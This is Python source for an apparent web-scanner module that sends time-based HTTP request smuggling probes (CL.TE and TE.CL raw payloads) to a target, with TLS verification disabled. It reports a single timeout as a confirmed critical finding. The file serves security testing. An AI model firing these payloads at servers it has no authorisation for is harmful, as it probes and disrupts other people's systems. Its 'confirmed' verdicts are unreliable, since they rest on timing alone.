"""
SmugglingModule — GhostRecon module.
"""
import re
import time
import urllib.parse

try:
    import requests
    from requests.exceptions import RequestException
except ImportError:
    requests = None

from modules import BaseModule


class SmugglingModule(BaseModule):
    NAME = "HTTP Smuggling"

    def run(self):
        self.ui.section("HTTP Request Smuggling — Passive Detection")
        if not requests:
            return
        try:
            import urllib3; urllib3.disable_warnings()
        except Exception:
            pass

        # Passive: check for proxy/load balancer headers that may indicate vuln infra
        resp = self._get(self.base_url)
        if not resp:
            return

        h = {k.lower(): v for k, v in resp.headers.items()}
        proxy_indicators = ["x-forwarded-for", "via", "x-varnish", "x-cache",
                            "cf-ray", "x-amz-cf-id", "x-cdn"]
        has_proxy = any(p in h for p in proxy_indicators)

        if has_proxy:
            self.ui.info("Proxy infrastructure detected — initiating active smuggling probes...")
            self._probe_smuggling()
        else:
            self.ui.info("No proxy layer detected — smuggling risk lower, but testing anyway...")
            self._probe_smuggling()
            
    def _probe_smuggling(self):
        """Active time-based HTTP request smuggling probe."""
        import socket
        import ssl
        from urllib.parse import urlparse
        
        parsed = urlparse(self.base_url)
        host = parsed.netloc
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        use_ssl = parsed.scheme == 'https'
        
        # CL.TE Time-based payload (Content-Length is primary, Transfer-Encoding is secondary)
        # If frontend uses CL (reads all), backend uses TE (stops at 0), the extra 'X' gets queued
        cl_te_req = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Content-Length: 4\r\n"
            f"\r\n"
            f"1\r\n"
            f"Z\r\n"
            f"Q\r\n"
        ).encode()

        # TE.CL Time-based payload
        # If frontend uses TE (stops at 0), backend uses CL (waits for 6 bytes), it waits for the 'X'
        te_cl_req = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Content-Length: 6\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"X"
        ).encode()
        
        def send_raw(payload, timeout_val=10):
            try:
                sock = socket.create_connection((host, port), timeout=timeout_val)
                if use_ssl:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)
                
                t0 = time.time()
                sock.sendall(payload)
                sock.recv(4096)
                elapsed = time.time() - t0
                sock.close()
                return elapsed
            except socket.timeout:
                return timeout_val
            except Exception:
                return 0
                
        # Run tests
        self.ui.info("Testing CL.TE...")
        cl_te_time = send_raw(cl_te_req)
        time.sleep(self.delay)
        
        self.ui.info("Testing TE.CL...")
        te_cl_time = send_raw(te_cl_req)
        
        # If either hits the timeout (meaning the backend hung waiting for the rest of the smuggled body)
        if cl_te_time >= 9:
            self.db.add(
                title="HTTP Request Smuggling (CL.TE) Confirmed",
                severity="critical", url=self.base_url, module=self.NAME,
                description="The server is vulnerable to CL.TE HTTP Request Smuggling. The frontend server processed the Content-Length header, while the backend processed Transfer-Encoding. This allowed a time-based payload to cause a socket timeout.",
                remediation="Ensure front-end and back-end servers consistently parse Transfer-Encoding and Content-Length headers. Prefer HTTP/2 for back-end connections to avoid smuggling.",
                cvss="9.8", 
                confidence="CONFIRMED",
                confidence_score=95,
                validation_steps=["cl_te_timing_delay"]
            )
            self.ui.find("critical", "HTTP Smuggling (CL.TE)", self.base_url)
            
        elif te_cl_time >= 9:
            self.db.add(
                title="HTTP Request Smuggling (TE.CL) Confirmed",
                severity="critical", url=self.base_url, module=self.NAME,
                description="The server is vulnerable to TE.CL HTTP Request Smuggling. The frontend server processed Transfer-Encoding, while the backend processed Content-Length. This allowed a time-based payload to cause a socket timeout.",
                remediation="Ensure front-end and back-end servers consistently parse Transfer-Encoding and Content-Length headers. Prefer HTTP/2 for back-end connections to avoid smuggling.",
                cvss="9.8", 
                confidence="CONFIRMED",
                confidence_score=95,
                validation_steps=["te_cl_timing_delay"]
            )
            self.ui.find("critical", "HTTP Smuggling (TE.CL)", self.base_url)
        else:
            self.ui.info("No time-based smuggling vulnerability detected.")


# ─── CORS Module ───────────────────────────────────────────────────────────────